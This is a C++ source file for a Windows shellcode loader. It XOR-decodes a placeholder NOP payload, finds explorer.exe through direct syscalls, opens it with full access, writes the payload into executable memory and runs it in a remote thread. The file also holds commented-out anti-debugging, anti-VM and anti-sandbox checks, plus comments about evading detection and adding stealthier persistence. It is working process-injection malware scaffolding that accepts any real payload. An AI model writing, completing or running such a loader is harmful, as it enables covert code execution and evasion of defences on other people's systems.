// Anti-forensics headers. anti_vm.h must be first to ensure winsock2.h is included before windows.h
// #include "anti_vm.h"

// Undefine __cpuid to prevent conflict between <cpuid.h> (from anti_vm) and <intrin.h> (from anti_debug)
// #if defined(__GNUC__) && defined(__cpuid)
// #undef __cpuid
// #endif

// #include "anti_debug.h"
// #include "anti_sandbox.h"

#include <windows.h>
#include <winternl.h>
#include <wchar.h>
#include "syscalls.h" // Use syscalls instead of windows.h

#include <iostream>
#include <vector>
#include <string>
#include <stdlib.h>

// --- Shellcode Data (Dummy Placeholder) ---
unsigned char dummy_shellcode[] = { 0x90, 0x90, 0x90, 0x90 }; // NOP sled

unsigned char* shellcode_chunks[] = { dummy_shellcode };
size_t chunk_sizes[] = { sizeof(dummy_shellcode) };
const int num_chunks = 1;
const unsigned char xor_key = 0x41;
// --- End Shellcode Data ---

// The persistence logic is removed as it uses WinAPI calls that are easily detected.
// A more stealthy persistence mechanism would be needed.

// The InitializeObjectAttributes macro and CLIENT_ID structure are defined in winternl.h

// New FindTargetProcess using syscalls
DWORD FindTargetProcess(const wchar_t* processName) {
    ULONG bufferSize = 1024 * 1024;
    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)malloc(bufferSize);
    if (!spi) {
        return 0;
    }
    ULONG returnLength;

    NTSTATUS status = SyscallQuerySystemInformation(SystemProcessInformation, spi, bufferSize, &returnLength);

    if (!NT_SUCCESS(status)) {
        free(spi);
        return 0;
    }

    PSYSTEM_PROCESS_INFORMATION current = spi;
    while (true) {
        if (current->ImageName.Buffer != NULL && current->ImageName.Length > 0) {
            if (_wcsicmp(current->ImageName.Buffer, processName) == 0) {
                DWORD pid = (DWORD)(uintptr_t)current->UniqueProcessId;
                free(spi);
                return pid;
            }
        }
        if (current->NextEntryOffset == 0) {
            break;
        }
        current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);
    }

    free(spi);
    return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    /*
    if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {
        return 1;
    }
    */
	
    size_t total_size = 0;
    for (int i = 0; i < num_chunks; ++i) {
        total_size += chunk_sizes[i];
    }
	
    std::vector<unsigned char> shellcode_buffer;
    shellcode_buffer.reserve(total_size);

    for (int i = 0; i < num_chunks; ++i) {
        for (size_t j = 0; j < chunk_sizes[i]; ++j) {
            shellcode_buffer.push_back(shellcode_chunks[i][j] ^ xor_key);
        }
    }
	
    DWORD pid = FindTargetProcess(L"explorer.exe");
    if (pid == 0) {
        return 1;
    }

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    CLIENT_ID clientId = { (HANDLE)(uintptr_t)pid, 0 };

    NTSTATUS status = SyscallOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);

    if (!NT_SUCCESS(status) || hProcess == NULL) {
        return 1;
    }

    PVOID pRemoteAddress = NULL;
    SIZE_T shellcodeSize = shellcode_buffer.size();
    status = SyscallAllocateVirtualMemory(hProcess, &pRemoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status)) {
        SyscallClose(hProcess);
        return 1;
    }

    SIZE_T bytesWritten;
    status = SyscallWriteVirtualMemory(hProcess, pRemoteAddress, shellcode_buffer.data(), shellcode_buffer.size(), &bytesWritten);

    if (!NT_SUCCESS(status)) {
        SyscallClose(hProcess);
        return 1;
    }

    HANDLE hThread = NULL;
    status = SyscallCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, 0, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status)) {
        SyscallClose(hProcess);
        return 1;
    }

    SyscallClose(hThread);
    SyscallClose(hProcess);

    return 0;
}
